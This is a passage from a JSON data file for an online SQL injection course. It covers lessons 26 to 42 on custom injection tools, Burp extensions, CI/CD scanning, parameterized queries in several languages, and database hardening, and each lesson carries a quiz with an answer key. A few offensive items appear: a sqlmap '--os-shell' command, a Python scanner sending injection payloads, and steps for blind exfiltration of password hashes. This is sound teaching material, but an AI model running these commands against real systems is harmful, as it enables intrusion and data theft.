                        "language": "bash",
                        "code": "# This powerful command attempts to escalate a confirmed SQLi to Remote Code Execution.\n# It will prompt you for the specifics, such as the web root directory.\nsqlmap -u \"http://vulnerable/app.php?id=1\" -p id --os-shell"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the purpose of the `--tamper` flag in `sqlmap`?", "options": ["To make the attack slower", "To specify a script that will obfuscate the attack payloads to try and bypass a WAF", "To set the database type", "To get an OS shell"], "correct": 1, "explanation": "Tamper scripts are the primary mechanism within `sqlmap` for implementing the evasion and obfuscation techniques discussed in earlier lessons." }
                    ]
                }
            },
            {
                "id": "lesson-26-custom-injection-tools",
                "title": "Lesson 26: Custom Injection Tools",
                "duration": "120 min",
                "objectives": [
                    "Develop a basic SQL injection vulnerability scanner in Python",
                    "Write a script to automate blind, time-based data exfiltration",
                    "Create custom payload generators for specific bypass techniques",
                    "Understand how to parse and analyze results programmatically"
                ],
                "content": {
                    "overview": "While tools like `sqlmap` are incredibly powerful, there are times when a custom script is needed to exploit a non-standard vulnerability or to automate a very specific task. This lesson covers the fundamentals of building your own SQLi tools, primarily using Python.",
                    "sections": [
                        {
                            "title": "Automating Blind SQLi Exfiltration",
                            "content": "<p>Boolean and time-based blind SQLi are extremely tedious to perform manually. This makes them a perfect use case for a custom script. Your script can automate the process of asking thousands of true/false questions to extract data.</p><h3>The Script's Logic:</h3><ol><li>Establish a baseline response time or content for a 'false' condition.</li><li>Iterate through characters `1` to `N` of the data you want to steal (e.g., a password hash).</li><li>For each character position, iterate through all possible characters (a-z, 0-9).</li><li>Construct the specific blind SQLi payload for that character (e.g., `...AND SUBSTRING(password,1,1)='a'`).</li><li>Send the request and check the response. For boolean-based, check if the content matches the 'true' response. For time-based, check if the response time exceeds your delay threshold.</li><li>If the condition is met, append the character to your result and move to the next character position.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Basic SQLi Scanner Logic (Python)",
                        "language": "python",
                        "code": "import requests\n\ndef scan_sqli(url, param):\n    # 1. Simple tick test for error-based SQLi\n    payload = \"'\"\n    r = requests.get(f\"{url}?{param}={payload}\")\n    if \"You have an error in your SQL syntax\" in r.text:\n        print(f\"[+] Vulnerable to Error-Based SQLi at parameter: {param}\")\n        return True\n    \n    # 2. Boolean-based test\n    payload_true = \"' OR '1'='1\"\n    payload_false = \"' OR '1'='2\"\n    r_true = requests.get(f\"{url}?{param}={payload_true}\")\n    r_false = requests.get(f\"{url}?{param}={payload_false}\")\n    if len(r_true.text) != len(r_false.text):\n        print(f\"[+] Vulnerable to Boolean-Based Blind SQLi at parameter: {param}\")\n        return True\n        \n    return False\n\n# Example usage\n# scan_sqli(\"http://testphp.vulnweb.com/listproducts.php\", \"cat\")"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why would a penetration tester write a custom SQLi script instead of just using a tool like `sqlmap`?", "options": ["Because `sqlmap` doesn't work", "To exploit a non-standard or complex vulnerability that automated tools miss, or to automate a very specific post-exploitation task", "It is easier to write a custom script", "Because Python is the only language that works"], "correct": 1, "explanation": "Custom scripting provides the ultimate flexibility to adapt to unique application logic or to perform highly specific, chained exploits that are beyond the scope of a general-purpose scanner." }
                    ]
                }
            },
            {
                "id": "lesson-27-burp-suite-extensions",
                "title": "Lesson 27: Burp Suite Extensions",
                "duration": "120 min",
                "objectives": [
                    "Extend Burp Suite's functionality with the BApp Store",
                    "Use popular SQLi-focused extensions like 'Logger++' and 'Autorize'",
                    "Write a basic custom extension to process payloads or results"
                ],
                "content": {
                    "overview": "Burp Suite's power can be dramatically extended through its rich ecosystem of third-party and custom extensions. This lesson focuses on leveraging and building Burp extensions to make your SQLi testing more efficient and effective.",
                    "sections": [
                        {
                            "title": "Leveraging the BApp Store",
                            "content": "<p>The BApp Store is Burp Suite's official marketplace for extensions. Many of these are invaluable for SQLi testing.</p><h3>Key Extensions:</h3><ul><li><strong>`SQLiPy`:</strong> A powerful extension that integrates `sqlmap` directly into Burp. You can right-click a request in Burp and send it straight to a `sqlmap` scan.</li><li><strong>`Autorize`:</strong> An essential extension for testing for access control vulnerabilities (which are often found alongside SQLi). It can automatically repeat every request you make with a lower-privileged user's session token to quickly find authorization bypasses.</li><li><strong>`Logger++`:</strong> Provides a much more advanced and filterable log of all requests and responses, making it easier to track your testing.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary advantage of using a Burp Suite extension like `SQLiPy`?", "options": ["It makes Burp Suite free", "It seamlessly integrates the power of the `sqlmap` automated scanner directly into your manual testing workflow in Burp", "It protects you from SQLi attacks", "It automatically writes your report"], "correct": 1, "explanation": "This integration provides the best of both worlds: the detailed, manual control of Burp for finding the injection point, and the powerful automation of `sqlmap` for exploiting it, all in one interface." }
                    ]
                }
            },
            {
                "id": "lesson-28-cicd-integration",
                "title": "Lesson 28: CI/CD Integration Testing",
                "duration": "120 min",
                "objectives": [
                    "Integrate automated SQL injection scanning into a CI/CD pipeline",
                    "Use DAST tools to test for SQLi in a staging environment",
                    "Manage false positives from automated security scanners",
                    "Fail the build based on the severity of security findings"
                ],
                "content": {
                    "overview": "To find SQLi vulnerabilities at scale, testing must be automated and integrated into the development process. This DevSecOps-focused lesson covers how to integrate automated SQLi scanning directly into a Continuous Integration / Continuous Deployment (CI/CD) pipeline.",
                    "sections": [
                        {
                            "title": "DAST in the Pipeline",
                            "content": "<p>You can integrate a Dynamic Application Security Testing (DAST) tool into your pipeline. This is typically done after the application is deployed to a dedicated staging or testing environment.</p><h3>The Automated Workflow:</h3><ol><li>The pipeline deploys the application to the staging server.</li><li>The pipeline then triggers a DAST tool (like OWASP ZAP or a commercial scanner) via an API call.</li><li>The DAST tool runs an authenticated scan against the staging application, specifically looking for SQLi and other vulnerabilities.</li><li>The scanner sends its results back to the pipeline.</li><li>The pipeline has a quality gate. If the scan finds any high or critical severity SQLi vulnerabilities, the pipeline fails. This prevents the vulnerable code from ever being deployed to production.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary goal of integrating a DAST scanner into a CI/CD pipeline?", "options": ["To make the deployment slower", "To automatically find and block vulnerabilities like SQLi *before* the code is released to production", "To replace manual penetration testing entirely", "To generate more alerts for the security team"], "correct": 1, "explanation": "This is a key 'shift left' security practice. It acts as an automated security gate, preventing easily-discoverable vulnerabilities from reaching production." }
                    ]
                }
            },
            {
                "id": "lesson-29-sqli-detection",
                "title": "Lesson 29: SQL Injection Detection",
                "duration": "120 min",
                "objectives": [
                    "Use Static Application Security Testing (SAST) to find SQLi in source code",
                    "Understand how Dynamic Application Security Testing (DAST) finds SQLi",
                    "Explore the role of Runtime Application Self-Protection (RASP) in blocking attacks",
                    "Use Machine Learning for anomalous query detection"
                ],
                "content": {
                    "overview": "This lesson switches from the attacker's perspective to the defender's. We will explore the different technologies and methodologies used to detect and block SQL injection attacks, both before and after an application is deployed.",
                    "sections": [
                        {
                            "title": "SAST and DAST for Detection",
                            "content": "<ul><li><strong>Static Application Security Testing (SAST):</strong> A 'white-box' tool that scans your application's source code for vulnerability patterns. It can find SQLi by tracing the flow of data from a user-controlled source (like an HTTP request) to a sink (a function that executes a database query). If it sees the data is used in the sink without proper parameterization, it will flag a potential SQLi vulnerability.</li><li><strong>Dynamic Application Security Testing (DAST):</strong> A 'black-box' tool that attacks a running application from the outside, just as we have been doing in this course. It will send a barrage of automated SQLi payloads (ticks, boolean tests, time delays) to every input parameter it can find and analyze the responses to detect vulnerabilities.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A tool that analyzes your source code for SQLi patterns without actually running the application is known as a:", "options": ["DAST tool", "WAF", "SAST tool", "SIEM"], "correct": 2, "explanation": "Static analysis (SAST) works on the code itself, making it a powerful tool for finding vulnerabilities early in the development lifecycle." }
                    ]
                }
            },
            {
                "id": "lesson-30-parameterized-queries",
                "title": "Lesson 30: Parameterized Query Implementation",
                "duration": "120 min",
                "objectives": [
                    "Master the implementation of parameterized queries (prepared statements) in various languages",
                    "Securely configure Object-Relational Mapping (ORM) frameworks to prevent SQLi",
                    "Understand safe alternatives to dynamic query construction"
                ],
                "content": {
                    "overview": "This is the most important defensive lesson in the entire course. We will provide a deep dive into the number one defense against SQL injection: the correct use of parameterized queries. You will learn how to implement this control in various popular programming languages and frameworks.",
                    "sections": [
                        {
                            "title": "Prepared Statement Usage",
                            "content": "<p>Prepared statements are a feature of most modern database drivers. They force you to separate your SQL code from your user data.</p><h3>The Secure Pattern:</h3><ol><li><strong>Prepare:</strong> You first send your SQL query to the database, but you use a placeholder (usually a `?`) for each piece of user data. `SELECT * FROM products WHERE id = ?`. The database parses this and creates an execution plan.</li><li><strong>Bind:</strong> You then bind the user-supplied data to the placeholders in the prepared statement. The database driver ensures this data is treated strictly as data, not as executable code.</li><li><strong>Execute:</strong> You then execute the prepared statement.</li></ol><p>Because the query's structure is already parsed and locked in before the user data is introduced, there is no way for the user data to alter the query's logic. This structurally mitigates the vulnerability.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "ORM Security",
                            "content": "<p>Modern applications often use an Object-Relational Mapper (ORM) like Hibernate (Java) or SQLAlchemy (Python). By default, these ORMs use parameterized queries under the hood, making them safe from SQLi. However, most ORMs also have a feature to execute a 'raw' or 'native' SQL query. If a developer uses this feature and reverts to building the query with string concatenation, they can re-introduce an SQLi vulnerability into an otherwise safe application.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the key security benefit of a parameterized query (prepared statement)?", "options": ["It makes the query run faster", "It structurally separates the SQL code from the user-supplied data, preventing the data from being interpreted as a command", "It encrypts the entire database", "It validates that the user is an administrator"], "correct": 1, "explanation": "This fundamental separation of code and data is the core reason why parameterized queries are the primary defense against SQL injection." }
                    ]
                }
            },
            {
                "id": "lesson-31-input-validation",
                "title": "Lesson 31: Input Validation and Sanitization",
                "duration": "120 min",
                "objectives": [
                    "Implement a defense-in-depth strategy with input validation",
                    "Use allow-list validation for all user-supplied data",
                    "Understand the difference between validation, sanitization, and output encoding",
                    "Apply context-aware validation for different data types"
                ],
                "content": {
                    "overview": "While parameterized queries are the primary fix for SQLi, strong input validation provides a critical second layer of defense. This lesson covers the best practices for validating and sanitizing user input to prevent a wide range of attacks.",
                    "sections": [
                        {
                            "title": "Input Validation vs. Sanitization",
                            "content": "<ul><li><strong>Validation:</strong> The process of checking if input meets a set of strict criteria. If it does not, the input should be **rejected**. This is the preferred approach.</li><li><strong>Sanitization:</strong> The process of attempting to 'clean' input by removing or modifying potentially malicious characters. This is risky and often prone to bypass.</li></ul><h3>Allow-List Validation:</h3><p>The golden rule is to use allow-list (whitelist) validation. For every piece of user input, you should have a strict definition of what is 'good' and reject anything else. For example, a username parameter might be defined as 'must be between 8 and 20 characters and can only contain alphanumeric characters'.</p>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary difference between input validation and input sanitization?", "options": ["There is no difference", "Validation checks if input is good and rejects it if it's bad; Sanitization tries to clean up bad input", "Validation is done on the client, sanitization on the server", "Sanitization is more secure"], "correct": 1, "explanation": "Validation (rejecting bad input) is a much safer and more robust security strategy than sanitization (trying to fix bad input)." }
                    ]
                }
            },
            {
                "id": "lesson-32-database-hardening",
                "title": "Lesson 32: Database Security Hardening",
                "duration": "120 min",
                "objectives": [
                    "Apply the principle of least privilege to database user accounts",
                    "Implement network segmentation to protect the database server",
                    "Configure comprehensive database auditing and logging",
                    "Securely manage database backups"
                ],
                "content": {
                    "overview": "A secure application is not enough if the database itself is misconfigured. This lesson covers the database administration best practices for hardening your database server to provide a strong defense-in-depth posture against SQLi and other attacks.",
                    "sections": [
                        {
                            "title": "Least Privilege for Database Accounts",
                            "content": "<p>The web application's user account in the database should have the absolute minimum set of privileges it needs to function. It should not have administrative privileges. For example, the web app's user should only be granted `SELECT`, `INSERT`, and `UPDATE` on the specific application tables. It should not be allowed to perform `DROP TABLE` or access administrative functions like `xp_cmdshell`. This contains the 'blast radius' of an SQLi attack. Even if an attacker finds an SQLi vulnerability, the damage they can do is limited by the web user's permissions.</p>",
                            "image": "https://images.unsplash.com/photo-1554224155-83e8b835d07a?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Network Segmentation",
                            "content": "<p>Your database server should be on its own isolated network segment (a private subnet). The only traffic allowed to the database port should be from your application servers. Direct access from the internet or even from the web server tier should be blocked at the network firewall level.</p>",
                            "image": "https://images.unsplash.com/photo-1599691888286-93e433f064b8?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most important hardening step for the database account used by your web application?", "options": ["Give it full DBA/sysadmin privileges", "Grant it the minimum set of permissions (e.g., SELECT, INSERT) on only the tables it needs to do its job", "Use a simple, easy-to-remember password", "Disable all logging"], "correct": 1, "explanation": "The principle of least privilege is a fundamental defense-in-depth control. It ensures that even if an attacker finds an SQLi flaw, the scope of their damage is significantly limited." }
                    ]
                }
            },
            {
                "id": "lesson-33-php-sqli-prevention",
                "title": "Lesson 33: PHP SQLi Prevention",
                "duration": "120 min",
                "objectives": [
                    "Implement secure database access in modern PHP using PDO and MySQLi",
                    "Understand the risks of legacy PHP functions and disabled security features",
                    "Securely configure popular PHP frameworks to prevent SQLi"
                ],
                "content": {
                    "overview": "This language-specific lesson focuses on the modern, secure way to interact with databases in PHP. We will cover how to use the built-in PDO and MySQLi extensions to implement parameterized queries correctly.",
                    "sections": [
                        {
                            "title": "PDO (PHP Data Objects)",
                            "content": "<p>PDO is the modern, object-oriented, and recommended way to access databases in PHP. It provides a consistent interface across many different database types and strongly supports prepared statements.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Secure Prepared Statement with PDO (PHP)",
                        "language": "php",
                        "code": "<?php\n$pdo = new PDO('mysql:host=localhost;dbname=test', $user, $pass);\n\n// 1. Prepare the statement with a placeholder\n$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');\n\n// 2. Execute, binding the user input. The driver handles safe parameterization.\n$stmt->execute(['email' => $_GET['email']]);\n\n$user = $stmt->fetch();\n?>"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the modern, recommended extension in PHP for secure database access using prepared statements?", "options": ["The original `mysql_` functions", "PDO (PHP Data Objects)", "echo", "include"], "correct": 1, "explanation": "The original `mysql_` functions are deprecated and did not support prepared statements, leading to widespread SQLi. PDO is the modern, secure standard." }
                    ]
                }
            },
            {
                "id": "lesson-34-java-j2ee-sqli-security",
                "title": "Lesson 34: Java/J2EE SQLi Security",
                "duration": "120 min",
                "objectives": [
                    "Implement prepared statements using the standard JDBC API",
                    "Securely configure Hibernate and other ORMs to prevent SQLi",
                    "Understand how to safely use the Java Persistence API (JPA)"
                ],
                "content": {
                    "overview": "This lesson focuses on Java, the workhorse of many large enterprise applications. We will cover the standard JDBC `PreparedStatement` interface and discuss the security considerations when using popular ORM frameworks like Hibernate.",
                    "sections": [
                        {
                            "title": "JDBC Prepared Statements",
                            "content": "<p>The standard Java Database Connectivity (JDBC) API provides the `PreparedStatement` interface as the built-in, primary mechanism for creating parameterized queries.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Secure `PreparedStatement` Usage (Java)",
                        "language": "java",
                        "code": "String customerId = request.getParameter(\"id\");\n\n// 1. Prepare the statement with a '?' placeholder\nString query = \"SELECT * FROM customers WHERE id = ?\";\nPreparedStatement pstmt = connection.prepareStatement(query);\n\n// 2. Bind the untrusted data to the placeholder.\n// The driver ensures this is treated as a literal string, not code.\npstmt.setString(1, customerId);\n\n// 3. Execute the safe, prepared query\nResultSet results = pstmt.executeQuery();"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In JDBC, the standard interface for creating parameterized queries to prevent SQLi is:", "options": ["`Statement`", "`PreparedStatement`", "`CallableStatement`", "`ResultSet`"], "correct": 1, "explanation": "The standard `Statement` object is vulnerable as it supports string concatenation. The `PreparedStatement` object is the specific interface designed for secure, parameterized queries." }
                    ]
                }
            },
            {
                "id": "lesson-35-dotnet-sqli-prevention",
                "title": "Lesson 35: .NET SQLi Protection",
                "duration": "120 min",
                "objectives": [
                    "Implement parameterized queries in ADO.NET",
                    "Understand how Entity Framework and LINQ protect against SQLi by default",
                    "Recognize insecure patterns that can re-introduce vulnerabilities"
                ],
                "content": {
                    "overview": "This lesson covers the specific defensive coding techniques for the Microsoft .NET framework. We will explore how to use parameters in raw ADO.NET and how modern frameworks like Entity Framework abstract this protection away.",
                    "sections": [
                        {
                            "title": "ADO.NET and Entity Framework",
                            "content": "<p>In the .NET world, modern data access is dominated by Entity Framework.</p><ul><li><strong>Entity Framework:</strong> The standard ORM for .NET. When you use the standard Language Integrated Query (LINQ) to build your queries (e.g., `context.Users.Where(u => u.Name == userName)`), Entity Framework automatically generates parameterized SQL queries under the hood, making your code safe by default.</li><li><strong>Raw ADO.NET:</strong> If you are not using an ORM, you must use the `SqlCommand` object and its `Parameters` collection to create parameterized queries.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1638218151909-86641b4e4776?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Secure Parameterized Query with ADO.NET (C#)",
                        "language": "csharp",
                        "code": "string connectionString = \"...\";\nstring queryString = \"SELECT * FROM Users WHERE Username = @username;\";\nstring userInput = TxtUsername.Text;\n\nusing (SqlConnection connection = new SqlConnection(connectionString))\n{\n    SqlCommand command = new SqlCommand(queryString, connection);\n    // 1. Add the parameter with a specific type.\n    command.Parameters.Add(\"@username\", SqlDbType.VarChar, 50).Value = userInput;\n    \n    connection.Open();\n    SqlDataReader reader = command.ExecuteReader();\n    // ...\n}"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "When using Entity Framework, how are standard LINQ queries protected from SQL injection?", "options": ["They are not protected", "Entity Framework automatically generates parameterized SQL queries from the LINQ expressions", "By a built-in WAF", "By input validation"], "correct": 1, "explanation": "This is a major security benefit of using a modern ORM; it makes the secure way the default way." }
                    ]
                }
            },
            {
                "id": "lesson-36-python-sqli-security",
                "title": "Lesson 36: Python SQLi Security",
                "duration": "120 min",
                "objectives": [
                    "Implement secure queries using the standard Python DB-API 2.0",
                    "Understand how Django and SQLAlchemy ORMs prevent SQLi",
                    "Recognize and avoid insecure patterns in Python database code"
                ],
                "content": {
                    "overview": "This lesson focuses on defensive programming for Python web applications. We will cover the standard DB-API for parameterization and how the two major ORMs, Django and SQLAlchemy, provide strong protection against SQL injection.",
                    "sections": [
                        {
                            "title": "DB-API 2.0 and ORMs",
                            "content": "<ul><li><strong>DB-API 2.0:</strong> The Python standard for database drivers. It specifies that parameters should be passed to the `execute` method as a tuple or dictionary, *not* formatted into the query string with `%` or `+`. The database driver is then responsible for safely substituting the parameters.</li><li><strong>Django ORM and SQLAlchemy:</strong> The two dominant ORMs in the Python world. Like Entity Framework in .NET, they generate parameterized queries by default, providing strong SQLi protection out of the box. You only become vulnerable if you drop down to execute raw SQL and use insecure string formatting.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Secure Parameterized Query with DB-API 2.0 (Python)",
                        "language": "python",
                        "code": "import sqlite3\n\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\nuser_input = 'admin' # From a web request\n\n# CORRECT: Use a '?' placeholder. Pass the parameters as a separate tuple.\n# The driver handles the safe substitution.\ncursor.execute(\"SELECT * FROM users WHERE username = ?\", (user_input,))\n\n# DANGEROUS: Do NOT do this!\n# cursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In the Python DB-API standard, how should user-supplied parameters be passed to the database?", "options": ["By using an f-string to format them into the query", "By passing them as a separate tuple or dictionary in the `execute` method", "By encrypting them first", "By validating them on the client side"], "correct": 1, "explanation": "This method ensures that the driver, not the developer, is responsible for the critical task of safely parameterizing the input." }
                    ]
                }
            },
            {
                "id": "lesson-37-mobile-app-sqli",
                "title": "Lesson 37: Mobile Application SQLi",
                "duration": "120 min",
                "objectives": [
                    "Identify SQLi vulnerabilities in the local SQLite databases used by mobile apps",
                    "Test the mobile application's backend APIs for server-side SQLi",
                    "Understand the risks of storing sensitive data in unprotected local databases"
                ],
                "content": {
                    "overview": "Mobile applications often use a local SQLite database for offline storage and caching. This lesson explores the unique aspects of SQLi in a mobile context, covering both vulnerabilities in the local database and the backend APIs.",
                    "sections": [
                        {
                            "title": "SQLite Injection",
                            "content": "<p>Many mobile applications use a local SQLite database. If the app constructs queries against this local database using untrusted input (e.g., from an inter-app communication channel or a deep link), it can be vulnerable to client-side SQLi. An attacker or a malicious app on the same phone could potentially use this to read or corrupt the application's local data.</p>",
                            "image": "https://images.unsplash.com/photo-1585250184288-5175908b083c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most common type of database used for local storage within a mobile application?", "options": ["Oracle", "Microsoft SQL Server", "PostgreSQL", "SQLite"], "correct": 3, "explanation": "SQLite is a lightweight, file-based database that is the standard for embedded and mobile applications on both Android and iOS." }
                    ]
                }
            },
            {
                "id": "lesson-38-cloud-database-security",
                "title": "Lesson 38: Cloud Database SQLi Testing",
                "duration": "120 min",
                "objectives": [
                    "Understand how SQLi risks manifest in cloud-native and managed databases",
                    "Test for SQLi in serverless applications that connect to databases",
                    "Leverage cloud-native security features (like IAM authentication) to mitigate SQLi impact"
                ],
                "content": {
                    "overview": "While cloud platforms provide secure infrastructure, the responsibility for writing secure application code remains with you. This lesson explores how SQLi vulnerabilities can exist in applications built on managed cloud databases (like AWS RDS or Azure SQL) and how to use cloud-native controls as a defense-in-depth layer.",
                    "sections": [
                        {
                            "title": "The Cloud Context",
                            "content": "<p>An SQLi vulnerability in an application running on an EC2 instance is fundamentally the same as on-premises. However, the cloud provides additional layers of defense that can limit the blast radius.</p><h3>Cloud-Native Defenses:</h3><ul><li><strong>IAM Authentication:</strong> If the application connects to the database using a least-privilege IAM role (e.g., AWS's IAM Database Authentication or GCP's Cloud SQL IAM), an attacker who exploits an SQLi flaw is still constrained by that role's permissions. They cannot perform actions the role does not allow.</li><li><strong>Network Segmentation:</strong> A well-architected cloud environment will place the database in a private subnet. Even if an attacker achieves RCE through the database, they are still trapped inside a private network, which limits their ability to exfiltrate data or connect back to their C2 server.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1607513746974-2c6444f49e75?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Does using a managed cloud database like AWS RDS automatically make your application immune to SQL injection?", "options": ["Yes, it is a fully managed service", "No, the customer is still responsible for writing secure application code, including using parameterized queries", "Only if you pay for the premium version", "Only on Tuesdays"], "correct": 1, "explanation": "This is a key part of the shared responsibility model. The cloud provider secures the database *infrastructure*, but you are responsible for the security of the application *code* that queries it." }
                    ]
                }
            },
            {
                "id": "lesson-39-big-data-sqli",
                "title": "Lesson 39: Big Data and Analytics Security",
                "duration": "120 min",
                "objectives": [
                    "Identify injection risks in data warehouses like BigQuery and Redshift",
                    "Test the security of Business Intelligence (BI) and visualization platforms",
                    "Understand how vulnerabilities can be introduced in ETL/ELT data pipelines"
                ],
                "content": {
                    "overview": "Big data platforms are often built on SQL-based query engines, making them a potential target for injection attacks. This lesson explores the unique considerations when assessing the security of data warehouses and the BI tools that sit on top of them.",
                    "sections": [
                        {
                            "title": "Injection in Data Warehouses",
                            "content": "<p>While services like Google BigQuery have strong built-in protections and use non-standard SQL dialects, any system that allows users to construct queries dynamically can be at risk. The primary threat is often not in the warehouse itself, but in the web-based Business Intelligence (BI) applications that are built on top of it. If a BI dashboard application insecurely concatenates a user's filter parameter into a BigQuery SQL query, it can be vulnerable to the same kinds of SQLi attacks as a traditional web application.</p>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Where is an SQL injection vulnerability most likely to be found in a big data analytics stack?", "options": ["In the underlying file storage", "In the web-based BI or dashboard application that constructs queries on behalf of the user", "In the network hardware", "In the operating system kernel"], "correct": 1, "explanation": "The custom-built application layer on top of the data warehouse is often the weakest link, where developers might accidentally introduce classic web vulnerabilities like SQLi." }
                    ]
                }
            },
            {
                "id": "lesson-40-iot-embedded-sqli",
                "title": "Lesson 40: IoT and Embedded SQLi",
                "duration": "120 min",
                "objectives": [
                    "Test for SQLi in the web interfaces of IoT and embedded devices",
                    "Analyze firmware to find database interaction code",
                    "Understand the challenges of testing in constrained environments"
                ],
                "content": {
                    "overview": "IoT and embedded devices (like routers, cameras, and industrial controls) often run a small, lightweight web server for management. These web interfaces are a very common source of vulnerabilities, including critical SQLi flaws.",
                    "sections": [
                        {
                            "title": "The Embedded Threat",
                            "content": "<p>These devices often run on older, unpatched software stacks and may use a lightweight database like SQLite. The web interfaces are often written with less security scrutiny than a major public-facing web application. As a result, classic, textbook SQL injection vulnerabilities are frequently discovered in the login pages and other input forms of these devices.</p>",
                            "image": "https://images.unsplash.com/photo-1544890225-2fde1e46f71b?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why are the web management interfaces of IoT devices often a fruitful target for finding SQLi vulnerabilities?", "options": ["They use the most modern and secure technology", "They are often built on older software and are not developed with the same level of security rigor as mainstream web applications", "They are not connected to the internet", "They do not use databases"], "correct": 1, "explanation": "This combination of outdated components and less security focus makes embedded device web interfaces a well-known soft target for attackers." }
                    ]
                }
            },
            {
                "id": "lesson-41-sqli-research",
                "title": "Lesson 41: SQLi Research Methodologies",
                "duration": "120 min",
                "objectives": [
                    "Understand the process of vulnerability research for new SQLi techniques",
                    "Learn how to discover 0-day SQLi flaws in database engines or frameworks",
                    "Analyze security patches to understand and reverse engineer vulnerabilities"
                ],
                "content": {
                    "overview": "This advanced lesson looks at the world of security research. We will explore the methodologies that security researchers use to discover new, previously unknown (0-day) SQL injection vulnerabilities, not just in web applications, but in the database engines themselves.",
                    "sections": [
                        {
                            "title": "Vulnerability Research",
                            "content": "<p>This involves deep analysis of a target's source code (if available) or binary (through reverse engineering). A researcher might look for edge cases in the database's SQL parser or find a new, obscure function that can be abused to bypass security filters. This is a highly specialized skill that pushes the boundaries of the field.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The process of analyzing a security patch to understand the vulnerability it fixes is an example of:", "options": ["Standard penetration testing", "Vulnerability research", "Compliance auditing", "Network monitoring"], "correct": 1, "explanation": "'Patch diffing' is a common technique used by researchers to discover the details of a vulnerability that may not have been fully disclosed publicly." }
                    ]
                }
            },
            {
                "id": "lesson-42-ai-ml-security-sqli",
                "title": "Lesson 42: Machine Learning and AI Security in SQLi",
                "duration": "120 min",
                "objectives": [
                    "Understand how ML can be used to improve WAFs for SQLi detection",
                    "Explore how AI can be used to automatically generate novel SQLi payloads",
                    "Discuss the future of AI-driven attack and defense"
                ],
                "content": {
                    "overview": "This forward-looking lesson explores the intersection of Artificial Intelligence and SQL injection. We will look at both sides of the coin: how ML is being used to build smarter defenses, and how attackers are starting to use AI to build more sophisticated attacks.",
                    "sections": [
                        {
                            "title": "AI in Attack and Defense",
                            "content": "<ul><li><strong>Defense:</strong> Next-generation WAFs are increasingly using machine learning to detect anomalous queries. Instead of relying on static signatures, they can learn a model of what 'normal' SQL queries for an application look like and then flag any query that deviates significantly from this model.</li><li><strong>Attack:</strong> Researchers are experimenting with using ML models (like Generative Adversarial Networks - GANs) to automatically generate polymorphic SQLi payloads that have a high probability of bypassing WAF filters.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1620712943543-959bab121695?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A WAF that learns a baseline of normal database queries and then flags anything that looks statistically different is an application of what technology?", "options": ["A static signature-based approach", "Machine learning-based anomaly detection", "A blacklist approach", "A simple firewall"], "correct": 1, "explanation": "This behavioral approach is a key feature of more modern, intelligent security systems." }
                    ]
                }
            },
            {
